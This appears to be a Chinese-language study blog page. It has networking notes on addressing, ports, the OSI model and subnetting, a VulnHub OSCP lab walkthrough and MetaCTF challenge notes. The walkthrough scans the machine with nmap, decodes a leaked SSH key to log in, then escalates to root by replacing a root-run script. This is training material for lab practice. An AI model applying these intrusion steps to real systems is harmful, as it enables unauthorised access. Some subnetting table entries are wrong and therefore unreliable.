<li><p>ifconfig</p>
</li>
<li><p>decimal notation</p>
<ul>
<li>A bunch of ones and zeros that are put together</li>
<li>eight bits</li>
<li>32bits</li>
<li>11111111.11111111.11111111.11111111 ⇒ 255.255.255.255</li>
</ul>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">128 64 32 16 8 4 2 1</span><br><span class="line"> 1   1  1  1 1 1 1 1 =&gt; 255</span><br><span class="line"> 0   0  0  1 1 1 1 1 =&gt; 31</span><br><span class="line"> 1   1  0  0 1 0 1 0 =&gt; 202</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>IPV4 ⇒ 2^32 → 4294967296 可以擁有的IP位址全部數量</p>
</li>
<li><p>IPV6 ⇒ 128bits hexadecimal</p>
<ul>
<li>2^128 → 3.4028236692093846346337460743177e+38 可以擁有的IP位址全部數量</li>
<li>IPv6 位址分為八組，每組四個十六進位數字，以冒號分隔。組內的前導零可以省略，連續的零組可以用雙冒號 (::) 表示，以簡化位址</li>
</ul>
</li>
</ul>
</li>
<li><p>Network address translation → 分配位址</p>
<ul>
<li>Private IP Address</li>
</ul>
<p>  <img src="/img/Net_Untitled.png" alt="Untitled">
  </p>
</li>
<li><p>OSI &gt; 3 layer → router</p>
<ul>
<li>透過IP 位址進行路由</li>
</ul>
</li>
<li><p>windows</p>
<ul>
<li>ipconfig</li>
</ul>
</li>
</ul>
<h2 id="MAC-Addresses"><a href="#MAC-Addresses" class="headerlink" title="MAC Addresses"></a>MAC Addresses</h2><ul>
<li>MAC（媒體存取控制）</li>
<li>指派給網路設備的網路介面控制器（NIC）的唯一識別碼</li>
<li>用於 OSI 模型的資料鏈結層，以確保資料傳送到本地網路內的正確設備</li>
<li>MAC 位址的長度通常為 48 位</li>
<li>由冒號或連字號分隔的六對十六進位數字的序列</li>
<li>使用mac address lookup輸入IPV6前三對數位識別查看相關資訊<ul>
<li><a target="_blank" rel="noopener" href="https://aruljohn.com/mac.pl">https://aruljohn.com/mac.pl</a></li>
<li>可以利用前三對數位識別網路介面卡，找出設備</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00:1A:2B:3C:4D:5E</span><br><span class="line">00:1A:2B -&gt; 前三對數位識別網路介面卡的製造商</span><br><span class="line">3C:4D:5E -&gt; 後三對數字提供特定設備的唯一識別碼</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>允許裝置在區域網路 (LAN) 內相互通訊</strong></li>
<li>當資料從同一網路上的一台裝置傳送到另一台裝置時，資料會封裝在包含來源 MAC 位址和目標 MAC 位址的乙太網路訊框中</li>
<li>路由器和交換器使用這些 MAC 位址將資料轉送到適當的目的地</li>
<li>MAC 位址特定於本機網絡，並不像 IP 位址那樣具有全域唯一性，僅在本地網段範圍內相關</li>
<li>資料需要傳輸到本機網路以外時，它會被封裝在包含來源IP位址和目標IP位址的網路封包中</li>
<li>基於硬體、特定於製造商的，與用於更大規模網路通訊的 IP 位址不同</li>
</ul>
<h2 id="TCP-UDP-and-the-Three-Way-Handshake"><a href="#TCP-UDP-and-the-Three-Way-Handshake" class="headerlink" title="TCP, UDP, and the Three-Way Handshake"></a>TCP, UDP, and the Three-Way Handshake</h2><ul>
<li><p>layer 4 → transport layer</p>
</li>
<li><p>TCP（Transmission Control Protocol (Connection Oriented Protocol)）和UDP（User Datagram Protocol (Connectionless Protocol)）是電腦網路中兩種常用的傳輸層協定</p>
</li>
<li><p>TCP 是一種連線導向的協議</p>
<ul>
<li><p>可透過 IP 網路提供可靠、有序且經過錯誤檢查的封包傳輸</p>
</li>
<li><p><strong>它保證從一台設備發送的資料被目標設備正確接收</strong></p>
</li>
<li><p>透過確認、重傳和流量控制等機制來實現這種可靠性</p>
</li>
<li><p>資料分成更小的資料包，為其分配序號，並確保它們在接收端正確重組</p>
</li>
<li><p>用於需要保證傳輸的應用程序，例如網頁瀏覽、電子郵件、文件傳輸和遠端登入。</p>
</li>
<li><p>HTTP</p>
</li>
<li><p>Three-Way Handshake 是 TCP 用來在兩個設備之間建立連線的過程</p>
<ul>
<li>資料傳輸開始之前發生的一系列三個步驟</li>
<li>SYN（同步）&gt; SYN-ACK（同步確認）&gt; ACK（確認）</li>
<li>SYN<ul>
<li>發起設備（通常稱為客戶端）將帶有 SYN 標誌的 TCP 封包傳送到目標設備（通常稱為伺服器）</li>
<li>資料包表示建立連接的願望並包括初始序號</li>
</ul>
</li>
<li>SYN-ACK<ul>
<li>接收到 SYN 封包後，目標裝置會使用同時設定了 SYN 和 ACK（確認）標誌的 TCP 封包進行回應</li>
<li>資料包確認初始 SYN 資料包的接收，並且還包含其自己的初始序號</li>
</ul>
</li>
<li>ACK<ul>
<li>發起裝置透過將 ACK 封包傳送回目的地來確認 SYN-ACK 封包</li>
<li>資料包確認連線的建立，並且通常包含遞增的序號</li>
</ul>
</li>
<li>三向握手完成，連線就建立了，兩個設備就準備好交換資料了</li>
<li>握手期間交換的序號用於確保資料以正確的順序發送和接收</li>
</ul>
<p>  <img src="/img/Net_Untitled1.png" alt="Untitled1"></p>
</li>
</ul>
</li>
<li><p>UDP 是一種無連線協議</p>
<ul>
<li>無法提供與 TCP 相同等級的可靠性</li>
<li>更簡單、更輕量，使其適合能夠容忍某些資料遺失或延遲的應用程式</li>
<li><strong>UDP 不建立連線或保證資料包的傳送</strong></li>
<li>將資料包從一個設備發送到另一台設備，而無需等待確認或重傳</li>
<li>用於串流媒體、線上遊戲、DNS（網域名稱系統）和 VoIP（IP 語音）等即時應用程式</li>
<li>DNS</li>
</ul>
</li>
</ul>
<h2 id="Common-Ports-and-Protocols"><a href="#Common-Ports-and-Protocols" class="headerlink" title="Common Ports and Protocols"></a>Common Ports and Protocols</h2><ul>
<li>某些協定同時使用 TCP 和 UDP，具體取決於特定功能和要求。</li>
<li>連接埠分配並不詳盡，其他應用程式和服務也可能使用不同的連接埠</li>
<li>TCP<ul>
<li>FTP(21) → File Transfer Protocol &gt;放置文件、取得文件</li>
<li>SSH(22) → Secure Shell &gt; 遠端登入 &gt; 加密轉換</li>
<li>Telnet(23) &gt; 明文 &gt; 遠端登入</li>
<li>SMTP(25) → Simple Mail Transfer Protocol &gt; 郵件</li>
<li>DNS(53) → Domain Name System &gt;TCP and UDP</li>
<li>HTTP(80) → Hypertext Transfer Protocol &gt; 不安全網站</li>
<li>HTTPS(443) →  Hypertext Transfer Protocol Secure &gt; 加密網站</li>
<li>P0P3(110) → Post Office Protocol version 3</li>
<li>SMB(139 + 445) → Server Message Block &gt; 文件共享相關 &gt; Wanna Cry virus &gt;永恆之藍</li>
<li>IMAP(143) → Internet Message Access Protocol</li>
<li>RDP(3389) → Remote Desktop Protocol</li>
<li>FTPS(990) → FTP over SSL&#x2F;TLS</li>
<li>LDAP(389) → Lightweight Directory Access Protocol &gt;TCP and UDP</li>
<li>MySQL(3306)</li>
<li>RDP(3389) → Remote Desktop Protocol</li>
</ul>
</li>
<li>UDP<ul>
<li>DNS(53) &gt; IP 位址解析</li>
<li>DHCP(67,68) → Dynamic Host Configuration Protocol &gt; 隨機關聯一個IP位址</li>
<li>TFTP(69) → Trivial File Transfer Protocol</li>
<li>SNMP(161) → Simple Network Management Protocol</li>
<li>NTP(123) → Network Time Protocol</li>
</ul>
</li>
</ul>
<h2 id="The-OSI-Model"><a href="#The-OSI-Model" class="headerlink" title="The OSI Model"></a>The OSI Model</h2><ul>
<li>OSI (Open Systems Interconnection) model 是一個概念框架</li>
<li>通訊系統的功能標準化為七個不同的層</li>
<li>每個層都有特定的職責，並與其上層和下層互動</li>
<li>pls do not throw sausage pizza away → PDNTSPA</li>
<li>Physical Layer<ul>
<li>透過實體媒體傳輸和接收原始非結構化資料位元</li>
<li>定義了設備之間實體介面的電氣、機械和功能特性</li>
<li>data cables, cat6</li>
</ul>
</li>
<li>Data Link Layer<ul>
<li>透過實體鏈路直接連接的節點之間資料幀的可靠傳輸</li>
<li>提供錯誤檢測和糾正、流量控制，並處理對物理介質的存取</li>
<li>乙太網路、Wi-Fi 和 PPP（點對點協定）</li>
<li>Switching, MAC address</li>
</ul>
</li>
<li>Network Layer<ul>
<li>支援封包跨不同網路的路由</li>
<li>處理邏輯尋址並根據網路條件和路由協定確定資料傳輸的最佳路徑</li>
<li>IP（Internet Protocol）是關鍵的網路層協定</li>
<li>IP address, routing</li>
</ul>
</li>
<li>Transport Layer<ul>
<li>確保端系統之間資料的可靠、有序傳送</li>
<li>資料分成更小的段，管理端對端通信，並提供錯誤恢復、流量控制和擁塞控制</li>
<li>TCP（傳輸控制協定）和UDP（用戶資料報協定）</li>
</ul>
</li>
<li>Session Layer<ul>
<li>建立、管理和終止應用程式之間的通訊會話</li>
<li>提供同步和對話控制機制，以實現設備之間的無縫通訊</li>
<li>處理會話檢查點和恢復</li>
<li>session management</li>
</ul>
</li>
<li>Presentation Layer<ul>
<li>負責資料表示、加密、壓縮和格式化</li>
<li>確保一個系統的應用層所發送的資料可以被另一個系統的應用層理解</li>
<li>處理資料語法和語義</li>
<li>WMV, JPEG, MOV</li>
</ul>
</li>
<li>Application Layer<ul>
<li>距離最終用戶最近的一層</li>
<li>為用戶應用程式提供服務</li>
<li>用於各種應用程式級服務的協議</li>
<li>例如文件傳輸、電子郵件、網頁瀏覽和遠端存取</li>
<li>HTTP、SMTP、FTP 和 DNS</li>
</ul>
</li>
<li>將複雜的網路通訊任務分成可管理的層，每個層專注於特定的功能</li>
<li>這種模組化方法有利於網路系統的互通性、易於實施和故障排除</li>
<li>不一定反映所有網路系統的確切實現，這些系統通常使用各種層和協定的混合</li>
</ul>
<h2 id="Subnetting"><a href="#Subnetting" class="headerlink" title="Subnetting"></a>Subnetting</h2><p>七秒子網劃分：  <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=ZxAwQB8TZsM">https://www.youtube.com/watch?v =ZxAwQB8TZsM</a></p>
<p>子網路指南：  <a target="_blank" rel="noopener" href="https://drive.google.com/file/d/1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe/view">https :&#x2F;&#x2F;drive.google.com&#x2F;file&#x2F;d&#x2F;1ETKH31-E7G-7ntEOlWGZcDZWuukmeHFe&#x2F;view</a></p>
<p><img src="/img/Net_Untitled2.png" alt="Untitled2"></p>
<ul>
<li>網路劃分為更小的子網路（稱為子網路）的過程</li>
<li>有效地使用 IP 位址並促進網路管理和路由。子網路劃分通常用於 IPv4 網路</li>
<li>涉及從 IP 位址的主機部分借用位元來建立子網路識別碼<ul>
<li>網路可以分為多個子網，每個子網路都有自己的 IP 位址範圍</li>
</ul>
</li>
<li>CIDR（無類別域間路由）表示法是一種用來表示 IP 位址及其對應子網路遮罩的方法</li>
<li>指定網路前綴長度，表示用於 IP 位址網路部分的位數</li>
<li>透過在 IP 位址後附加正斜線 (&#x2F;) 後接前綴長度來表示</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exampl1</span><br><span class="line">128 64 32 16 8 4 2 1  ||   128 64 32 16 8 4 2 1  ||  128 64 32 16 8 4 2 1 ||  128 64 32 16 8 4 2 1  </span><br><span class="line"> 1   1  1  1 1 1 1 1        1   1  1  1 1 1 1 1       1   1  1  1 1 1 1 1      0   0  0  0 0 0 0 0</span><br><span class="line">------------------------------------------------------------------------------------------------------------         </span><br><span class="line">         |||                       |||                        |||                     |||</span><br><span class="line">          8           +             8            +             8           +           0       =&gt;   /24</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">         255                       255                        255                      0         Hosts -&gt; 2^8 -&gt; 256</span><br><span class="line"></span><br><span class="line">============================================================================================================</span><br><span class="line"></span><br><span class="line">example2</span><br><span class="line">128 64 32 16 8 4 2 1  ||   128 64 32 16 8 4 2 1  ||  128 64 32 16 8 4 2 1 ||  128 64 32 16 8 4 2 1  </span><br><span class="line"> 1   1  1  1 1 1 1 1        1   1  1  1 1 1 1 1       1   1  1  1 1 1 1 1      1   1  0  0 0 0 0 0</span><br><span class="line">------------------------------------------------------------------------------------------------------------         </span><br><span class="line">         |||                       |||                        |||                     |||</span><br><span class="line">          8           +             8            +             8           +           2       =&gt;   /26</span><br><span class="line">------------------------------------------------------------------------------------------------------------</span><br><span class="line">         255                       255                        255                     192        Hosts -&gt; 2^6 -&gt; 64</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1    2    3    4    5    6    7    8   ||  255.0.0.0</span><br><span class="line"> 9   10   11   12   13   14   15   16   ||  255.255.0.0</span><br><span class="line">17   18   19   20   21   22   23   24   ||  255.255.255.0</span><br><span class="line">25   26   27   28   29   30   31   32   ||  </span><br><span class="line"></span><br><span class="line">Hosts     128   64   32   16    8    4    2    1</span><br><span class="line">Subnet    128  192  224  240  248  252  254  255</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  CIDR range           Subnet       Hosts      Network        Broadcast</span><br><span class="line">192.168.1.0/24      255.255.255.0     254     192.168.1.0    192.168.1.255</span><br><span class="line">192.168.1.0/28      255.255.255.240    14     192.168.1.0    192.168.1.15 </span><br><span class="line">192.168.1.16/28     255.255.255.240    14     192.168.1.16   192.168.1.31 </span><br><span class="line">192.168.0.0/23      255.255.254.0     510     192.168.0.0    192.168.1.255 </span><br><span class="line">192.168.2.0/23      255.255.254.0     510     192.168.2.0    192.168.3.255</span><br><span class="line">192.168.1.0/23      255.255.254.0     510     192.168.0.0    192.168.1.255</span><br><span class="line">192.168.0.0/22      255.255.252.0    1022     192.168.0.0    192.168.3.255</span><br><span class="line">192.168.1.0/26      255.255.255.192    62     192.168.1.0    192.168.0.63</span><br><span class="line">192.168.1.0/27      255.255.255.224    30     192.168.1.0    192.168.1.31</span><br><span class="line">======</span><br><span class="line">192.168.0.0/22 -&gt; 11111111.11111111.11111100.00000000</span><br><span class="line">										8         8        6              =&gt;22</span><br><span class="line"></span><br><span class="line">                **32 - 22 = 10** -&gt; 2^ 10 -&gt; 1024 -2</span><br><span class="line"></span><br><span class="line">192.168.0.0 -&gt; 11000000.10101000.00000000.00000000</span><br><span class="line"> =&gt;                 192.     168.     3.       255</span><br><span class="line">                 11000000.10101000.000000**11.11111111。**</span><br><span class="line"></span><br><span class="line">192.168.1.0/27-&gt; 11000000.10101000.00000001.00000000</span><br><span class="line">  **32 - 27 = 5 -&gt; 2^5** -&gt; 32 -2 </span><br><span class="line">-&gt; 11111111.11111111.11111111.11100000</span><br><span class="line">      255      255      255    224</span><br><span class="line"></span><br><span class="line">11000000.10101000.00000001.00000000</span><br><span class="line">11000000.10101000.00000001.00011111 =&gt; 192.168.1.31</span><br><span class="line"></span><br><span class="line">==========</span><br><span class="line"></span><br><span class="line">Hosts -&gt; 14 </span><br><span class="line">Subnet -&gt; 255.255.255.240 -&gt; /28 -&gt; 255.255.255.x</span><br><span class="line">            8  8   8  128+64+32+16</span><br><span class="line">											15 - 1 = 14 -&gt; Hosts</span><br><span class="line"></span><br><span class="line">Hosts -&gt; 510</span><br><span class="line">Subnet -&gt; 255.255.254.0 -&gt; /23 -&gt; 255.255.x.0</span><br><span class="line">                  1 + 8 -&gt; 9</span><br><span class="line">									 2^9 -&gt; hosts -&gt; 512</span><br><span class="line">									512-2 = 510 (兩位址用於廣播地址及網路地址)</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-oscp_voucher" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/oscp_voucher/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.088Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/oscp_voucher/">
        OSCP Voucher
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/infosec-prep-oscp,508/">InfoSec Prep: OSCP</a></p>
<p><a target="_blank" rel="noopener" href="https://falconspy.medium.com/infosec-prep-oscp-vulnhubwalkthrough-a09519236025">InfoSec Prep: OSCP VulnhubWalkthrough</a></p>
<hr>
<p>機器開啟後</p>
<p><img src="/img/oscpvou_Untitled.png" alt="Untitled"></p>
<p>用另一台kali的nmap</p>
<p><code>nmap -sV -A -v 192.168.32.128</code></p>
<p><img src="/img/oscpvou_Untitled_1.png" alt="Untitled"></p>
<p>可以看到一些重要資訊</p>
<ul>
<li><p>22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</p>
</li>
<li><p>80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))</p>
<ul>
<li>主頁面可以看到oscp是該機器的用戶</li>
</ul>
<p>  <img src="/img/oscpvou_Untitled_2.png" alt="Untitled"></p>
<ul>
<li>&#x2F;secret.txt</li>
</ul>
<p>  <img src="/img/oscpvou_Untitled_3.png" alt="Untitled"></p>
<p>  注意到這檔案，是base64加密過的</p>
<p>  <img src="/img/oscpvou_Untitled_4.png" alt="Untitled"></p>
<p>  這看起來像是id_rsa的文件內容</p>
<p>  <code>cat secret.txt| base64 -d &gt; id_rsa</code></p>
<p>  用這個登入ssh</p>
<p>  <code>ssh oscp@192.168.32.128 -i id_rsa</code></p>
<p>  <img src="/img/oscpvou_Untitled_5.png" alt="Untitled"></p>
<p>  接下來查看&#x2F;bin&#x2F;bash的權限並直接切換用戶到root</p>
<p>  <img src="/img/oscpvou_Untitled_6.png" alt="Untitled"></p>
<p>  我們在oscp的用戶下有個檔案</p>
<p>  <img src="/img/oscpvou_Untitled_7.png" alt="Untitled"></p>
<p>  當查看&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;ip-update.service</p>
<p>  <img src="/img/oscp_vouUntitled_8.png" alt="Untitled"></p>
<p>  由於不存在用戶信息，我們知道該<code>ip</code>腳本是以 root 身份運行的。由於該腳本位於 oscp 用戶目錄中，我們可以重命名當前腳本並創建我們自己的腳本，該腳本將以 root 身份運行。</p>
</li>
</ul>
<p>在前面WordPress網頁中，有說到flag在&#x2F;root&#x2F;中，列出目錄下所有文件，並重命名一個IP文件</p>
<p><img src="/img/oscpvou_Untitled_9.png" alt="Untitled"></p>
<p><img src="/img/oscpvou_Untitled_10.png" alt="Untitled"></p>
<p>然後需要先改viminfo檔權限才可以用vim編輯ip檔案</p>
<p><img src="/img/oscpvou_Untitled_11.png" alt="Untitled"></p>
<p>OSCP的機器重開機，再去ls.txt內容會看到flag</p>
<p><img src="/img/oscpvou_Untitled_12.png" alt="Untitled"></p>
<p>現在知道文件名稱了再改一下腳本，並重啟VM，到oscp的用戶下就會看到flag</p>
<p><img src="/img/oscpvou_Untitled_13.png" alt="Untitled"></p>
<p><img src="/img/oscpvou_Untitled_14.png" alt="Untitled"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-metactf" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/metactf/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.087Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/metactf/">
        METACTF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>Take a look at ConnectWind’s internal employee portal. In addition to company policies &amp; HR information, I heard it also stores flags.</p>
<p>Can you access the protected employee portal without knowing the password and steal the flag?</p>
<p><img src="/img/metactfimage.png" alt="image.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://metaproblems.com/71c5b42eb77639d5224be5589123de30/employee_portal.php</span><br></pre></td></tr></table></figure>

<p><img src="/img/metactfimage1.png" alt="image.png"></p>
<hr>
<p>We recovered this executable from a device, but we can’t figure out how to make the program run. We suspect the code was compiled for a system with a different CPU architecture.</p>
<p>Can you figure out which architecture it was compiled for? The flag is the name of the architecture. You don’t need to run or take apart the executable.</p>
<p>The flag is not in MetaCTF{} format, it’s just the name of the architecture. You only have 10 attempts on this challenge.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#file astronaut </span></span><br><span class="line">astronaut: ELF 32-bit LSB executable, Tensilica Xtensa, version 1 (SYSV), statically linked, with debug_info, not stripped</span><br><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#readelf -h  astronaut </span></span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              EXEC (Executable file)</span></span><br><span class="line"><span class="string">  Machine:                           Tensilica Xtensa Processor</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x400d3128</span></span><br><span class="line"><span class="string">  Start of program headers:          52 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          1007004 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               52 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           32 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         6</span></span><br><span class="line"><span class="string">  Size of section headers:           40 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         33</span></span><br><span class="line"><span class="string">  Section header string table index: 32</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Tensilica Xtensa</p>
</blockquote>
<hr>
<p>Your anonymous music producer friend (D34DM0053) is getting ready to publish an open letter on mental health in the music industry, but they don’t know much about computers. Can you help double check their letter to make sure it isn’t leaking their identity?</p>
<p><a target="_blank" rel="noopener" href="https://metaproblems.com/0778e85952c806a4f55fb61d12fd8ca0/D34DM0053_Open_Letter_Mental_Health.pdf">Here’s the letter in question.</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/kali/Desktop]</span><br><span class="line">└──╼ <span class="comment">#pdf-parser D34DM0053_Open_Letter_Mental_Health.pdf </span></span><br><span class="line">This program has not been tested with this version of Python (3.11.2)</span><br><span class="line">Should you encounter problems, please use Python version 3.11.1</span><br><span class="line">PDF Comment <span class="string">&#x27;%PDF-1.4\n&#x27;</span></span><br><span class="line"></span><br><span class="line">PDF Comment <span class="string">&#x27;%\xc3\xa4\xc3\xbc\xc3\xb6\xc3\x9f\n&#x27;</span></span><br><span class="line"></span><br><span class="line">obj 2 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 3 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 3 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 3 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 4 0</span><br><span class="line"> Type: /XObject</span><br><span class="line"> Referencing: 5 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /XObject</span><br><span class="line">    /Subtype /Image</span><br><span class="line">    /Width 1920</span><br><span class="line">    /Height 1920</span><br><span class="line">    /BitsPerComponent 8</span><br><span class="line">    /ColorSpace /DeviceGray</span><br><span class="line">    /Filter /DCTDecode</span><br><span class="line">    /Length 68385</span><br><span class="line">    /SMask 5 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 5 0</span><br><span class="line"> Type: /XObject</span><br><span class="line"> Referencing: 6 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /XObject</span><br><span class="line">    /Subtype /Image</span><br><span class="line">    /Width 1920</span><br><span class="line">    /Height 1920</span><br><span class="line">    /BitsPerComponent 8</span><br><span class="line">    /Length 6 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /ColorSpace /DeviceGray</span><br><span class="line">    /Decode [ 1 0 ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 6 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 8 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 9 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 9 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 19844</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 9 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 10 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 8 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /EAAAAA+DejaVuSans-BoldOblique</span><br><span class="line">    /Flags 68</span><br><span class="line">    /FontBBox [-1066 -385 1998 1121]</span><br><span class="line">    /ItalicAngle -30</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1120</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 8 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 11 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 247</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 12 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 10 0 R, 11 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /EAAAAA+DejaVuSans-BoldOblique</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 6</span><br><span class="line">    /Widths [600 830 695 695 995 695 695 ]</span><br><span class="line">    /FontDescriptor 10 0 R</span><br><span class="line">    /ToUnicode 11 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 13 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 14 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 14 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 22720</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 14 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"></span><br><span class="line">obj 15 0</span><br><span class="line"> Type: /FontDescriptor</span><br><span class="line"> Referencing: 13 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /FontDescriptor</span><br><span class="line">    /FontName /DAAAAA+DejaVuSans-Oblique</span><br><span class="line">    /Flags 68</span><br><span class="line">    /FontBBox [-1015 -350 1659 1068]</span><br><span class="line">    /ItalicAngle -30</span><br><span class="line">    /Ascent 928</span><br><span class="line">    /Descent -235</span><br><span class="line">    /CapHeight 1067</span><br><span class="line">    /StemV 80</span><br><span class="line">    /FontFile2 13 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 16 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 304</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 17 0</span><br><span class="line"> Type: /Font</span><br><span class="line"> Referencing: 15 0 R, 16 0 R</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Font</span><br><span class="line">    /Subtype /TrueType</span><br><span class="line">    /BaseFont /DAAAAA+DejaVuSans-Oblique</span><br><span class="line">    /FirstChar 0</span><br><span class="line">    /LastChar 18</span><br><span class="line">    /Widths <span class="string">&#x27;[600 974 612 591 634 615 317 591 633 611 633 317 411 634 277 634\n392 633 520 ]&#x27;</span></span><br><span class="line">    /FontDescriptor 15 0 R</span><br><span class="line">    /ToUnicode 16 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line"></span><br><span class="line">obj 18 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: 19 0 R</span><br><span class="line"> Contains stream</span><br><span class="line"></span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 19 0 R</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 27680</span><br><span class="line">  